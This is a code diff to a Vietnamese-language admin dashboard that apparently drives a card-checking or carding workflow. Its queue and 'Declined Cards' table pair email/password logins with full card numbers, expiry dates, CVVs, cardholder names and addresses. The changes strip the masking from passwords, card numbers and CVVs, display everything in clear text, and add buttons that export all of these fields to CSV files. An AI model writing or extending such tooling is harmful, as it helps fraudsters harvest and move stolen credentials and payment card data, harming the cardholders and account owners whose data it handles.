@@ -239,6 +239,7 @@ input:focus,select:focus,textarea:focus{border-color:var(--accent);}
         <span id="queue-count-badge" class="badge badge-queued">0 hàng</span>
         <div class="spacer"></div>
         <button class="btn btn-ghost btn-sm" onclick="loadQueue()">Làm mới</button>
+        <button class="btn btn-ghost btn-sm" onclick="exportQueueCSV()">⬇ Export CSV</button>
         <button class="btn btn-ghost btn-sm" onclick="clearDoneQueue()">Dọn Done/Failed</button>
         <button class="btn btn-danger btn-sm" onclick="clearQueue()">Xóa tất cả</button>
       </div>
@@ -359,6 +360,7 @@ input:focus,select:focus,textarea:focus{border-color:var(--accent);}
     <h2>Dashboard</h2>
     <div class="spacer"></div>
     <button class="btn btn-ghost btn-sm" onclick="loadDashboard()">🔄 Refresh</button>
+    <button class="btn btn-ghost btn-sm" onclick="exportDeclinedCSV()">⬇ Export CSV</button>
     <button class="btn btn-warn btn-sm" onclick="clearDeclined()">🗑 Xoá Declined</button>
   </div>
 
@@ -373,13 +375,13 @@ input:focus,select:focus,textarea:focus{border-color:var(--accent);}
 
   <!-- Declined records table -->
   <h3 style="margin-bottom:10px;font-size:.92rem;color:var(--muted);text-transform:uppercase;letter-spacing:.05em;">Declined Cards</h3>
-  <div class="table-wrap" style="margin-bottom:28px;">
+  <div class="table-wrap" style="margin-bottom:28px;overflow-x:auto;">
     <table id="dash-declined-table">
       <thead><tr>
-        <th>Timestamp</th><th>Email</th><th>Card</th><th>Cardholder</th><th>Reason</th>
+        <th>Timestamp</th><th>Email</th><th>Password</th><th>Card Number</th><th>Exp Month</th><th>Exp Year</th><th>CVV</th><th>Cardholder</th><th>Address</th><th>City</th><th>State</th><th>ZIP</th><th>Reason</th>
       </tr></thead>
       <tbody id="dash-declined-body">
-        <tr><td colspan="5" style="text-align:center;color:var(--muted);padding:20px;">Chưa có dữ liệu</td></tr>
+        <tr><td colspan="13" style="text-align:center;color:var(--muted);padding:20px;">Chưa có dữ liệu</td></tr>
       </tbody>
     </table>
   </div>
@@ -959,10 +961,12 @@ async function loadQueue() {
       <thead><tr style="background:var(--bg);">
         <th style="padding:6px 10px;text-align:left;color:var(--muted);font-weight:600;">#</th>
         <th style="padding:6px 10px;text-align:left;color:var(--muted);font-weight:600;">Email</th>
-        <th style="padding:6px 10px;text-align:left;color:var(--muted);font-weight:600;">Pass</th>
-        <th style="padding:6px 10px;text-align:left;color:var(--muted);font-weight:600;">Thẻ</th>
-        <th style="padding:6px 10px;text-align:left;color:var(--muted);font-weight:600;">Tháng/Năm</th>
+        <th style="padding:6px 10px;text-align:left;color:var(--muted);font-weight:600;">Password</th>
+        <th style="padding:6px 10px;text-align:left;color:var(--muted);font-weight:600;">Card Number</th>
+        <th style="padding:6px 10px;text-align:left;color:var(--muted);font-weight:600;">Exp Month</th>
+        <th style="padding:6px 10px;text-align:left;color:var(--muted);font-weight:600;">Exp Year</th>
         <th style="padding:6px 10px;text-align:left;color:var(--muted);font-weight:600;">CVV</th>
+        <th style="padding:6px 10px;text-align:left;color:var(--muted);font-weight:600;">Cardholder</th>
         <th style="padding:6px 10px;text-align:left;color:var(--muted);font-weight:600;">Status</th>
       </tr></thead><tbody>`;
     rows.forEach((row, i) => {
@@ -971,17 +975,16 @@ async function loadQueue() {
       const email = row.email || row.mail || row.raw || '';
       const pass = row.password || row.pass || '';
       const card = row.card_number || row.card || '';
-      const cardShow = card ? (card.slice(0,4)+'****'+card.slice(-4)) : '—';
-      const exp = card ? ((row.exp_month||'')+'/'+(row.exp_year||'')) : '';
-      const cvv = row.cvv || '';
       const bg = i%2===0 ? '' : 'background:rgba(255,255,255,.02);';
       html += `<tr style="${bg}">
         <td style="padding:5px 10px;color:var(--muted);">${i+1}</td>
         <td style="padding:5px 10px;">${esc(email)}</td>
-        <td style="padding:5px 10px;color:var(--muted);">${pass ? '••••' : '—'}</td>
-        <td style="padding:5px 10px;font-family:monospace;">${esc(cardShow)}</td>
-        <td style="padding:5px 10px;color:var(--muted);">${esc(exp)}</td>
-        <td style="padding:5px 10px;color:var(--muted);">${cvv ? '•••' : '—'}</td>
+        <td style="padding:5px 10px;color:var(--muted);">${esc(pass)}</td>
+        <td style="padding:5px 10px;font-family:monospace;color:#4dffa0;">${esc(card||'—')}</td>
+        <td style="padding:5px 10px;color:var(--muted);">${esc(row.exp_month||'—')}</td>
+        <td style="padding:5px 10px;color:var(--muted);">${esc(row.exp_year||'—')}</td>
+        <td style="padding:5px 10px;color:var(--muted);">${esc(row.cvv||'—')}</td>
+        <td style="padding:5px 10px;">${esc(row.cardholder_name||row.cardholder||'—')}</td>
         <td style="padding:5px 10px;font-weight:700;color:${col};">${st}</td>
       </tr>`;
     });
@@ -1577,16 +1580,24 @@ async function loadDashboard() {
     // Declined table
     const tbody = document.getElementById('dash-declined-body');
     const recs  = (d.declined_records || []).slice().reverse(); // mới nhất lên trên
+    _declinedRows = d.declined_records || []; // lưu để export
     if (recs.length === 0) {
-      tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--muted);padding:20px;">Chưa có dữ liệu</td></tr>';
+      tbody.innerHTML = '<tr><td colspan="13" style="text-align:center;color:var(--muted);padding:20px;">Chưa có dữ liệu</td></tr>';
     } else {
       tbody.innerHTML = recs.map(rec => {
-        const card = rec.card ? rec.card.slice(0,4)+'****'+rec.card.slice(-4) : '—';
         return `<tr>
-          <td style="font-size:.78rem;color:var(--muted)">${rec.timestamp||'—'}</td>
+          <td style="font-size:.75rem;color:var(--muted);white-space:nowrap">${escHtml(rec.timestamp||'—')}</td>
           <td>${escHtml(rec.email||'—')}</td>
-          <td style="font-family:'JetBrains Mono',monospace;font-size:.82rem">${escHtml(card)}</td>
+          <td style="color:var(--muted)">${escHtml(rec.password||'—')}</td>
+          <td style="font-family:'JetBrains Mono',monospace;font-size:.82rem;color:#4dffa0">${escHtml(rec.card||'—')}</td>
+          <td style="text-align:center">${escHtml(rec.exp_month||'—')}</td>
+          <td style="text-align:center">${escHtml(rec.exp_year||'—')}</td>
+          <td style="text-align:center;color:var(--muted)">${escHtml(rec.cvv||'—')}</td>
           <td>${escHtml(rec.cardholder||'—')}</td>
+          <td style="font-size:.78rem">${escHtml(rec.address||'—')}</td>
+          <td>${escHtml(rec.city||'—')}</td>
+          <td>${escHtml(rec.state||'—')}</td>
+          <td>${escHtml(rec.zip||'—')}</td>
           <td style="color:#ff6b6b">${escHtml(rec.reason||'—')}</td>
         </tr>`;
       }).join('');
@@ -1620,6 +1631,50 @@ async function loadDashboard() {
 
 function escHtml(s) {
   return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+// ── CSV export helpers ──────────────────────────────────────────────────────
+let _declinedRows = [];
+
+function csvEscape(v) {
+  const s = String(v == null ? '' : v);
+  if (s.includes(',') || s.includes('"') || s.includes('\n')) return '"' + s.replace(/"/g,'""') + '"';
+  return s;
+}
+
+function downloadCSV(filename, headers, rows) {
+  const lines = [headers.map(csvEscape).join(',')];
+  rows.forEach(r => lines.push(headers.map(h => csvEscape(r[h] ?? r[h.replace('card_number','card')] ?? '')).join(',')));
+  const blob = new Blob([lines.join('\n')], {type:'text/csv;charset=utf-8;'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a'); a.href=url; a.download=filename; a.click();
+  URL.revokeObjectURL(url);
+}
+
+async function exportQueueCSV() {
+  try {
+    const r = await fetch('/api/queue');
+    const d = await r.json();
+    const rows = d.rows || [];
+    if (!rows.length) { showToast('Queue rỗng','err'); return; }
+    const headers = ['email','password','card_number','exp_month','exp_year','cvv','cardholder_name','address','city','state','zip','_status'];
+    // normalize card field
+    const normalized = rows.map(r => ({...r, card_number: r.card_number || r.card || ''}));
+    downloadCSV('queue_export.csv', headers, normalized);
+    showToast('Đã xuất queue_export.csv','ok');
+  } catch(e) { showToast('Lỗi export','err'); }
+}
+
+async function exportDeclinedCSV() {
+  try {
+    const r = await fetch('/api/declined');
+    const d = await r.json();
+    const rows = (d.records || []);
+    if (!rows.length) { showToast('Không có dữ liệu declined','err'); return; }
+    const headers = ['timestamp','email','password','card','exp_month','exp_year','cvv','cardholder','address','city','state','zip','reason'];
+    downloadCSV('declined_export.csv', headers, rows);
+    showToast('Đã xuất declined_export.csv','ok');
+  } catch(e) { showToast('Lỗi export','err'); }
 }
 
 async function clearDeclined() {
